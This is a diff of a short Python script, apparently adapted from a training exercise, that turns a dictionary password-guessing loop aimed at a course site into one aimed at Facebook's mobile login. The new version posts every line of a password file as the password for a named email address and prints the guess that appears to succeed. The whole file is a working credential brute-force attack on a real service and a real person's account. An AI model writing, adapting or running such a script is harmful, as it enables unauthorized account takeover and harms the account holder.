@@ -5,18 +5,18 @@
 
 import requests
 
-url = 'http://ensino.solyd.com.br/login/index.php'
+url = 'https://m.facebook.com/login.php'
 
-arquivo = open('dicionario.txt')
+arquivo = open('password.txt')
 linhas = arquivo.readlines()
 
 for linha in linhas:
-    dados = {'username': 'example@example.com',
-             'password': linha}
+    dados = {'email': 'haxcoder11@gmail.com',
+             'pass': linha}
 
     resposta = requests.post(url, data=dados)
 
-    if "senha errados" in resposta.text:
-        print "Senha incorreta:", linha
+    if "Search Facebook" in resposta.text:
+        print "incorrect pass:", linha
     else:
-        print "Senha correta:", linha
+        print " password is:", linha
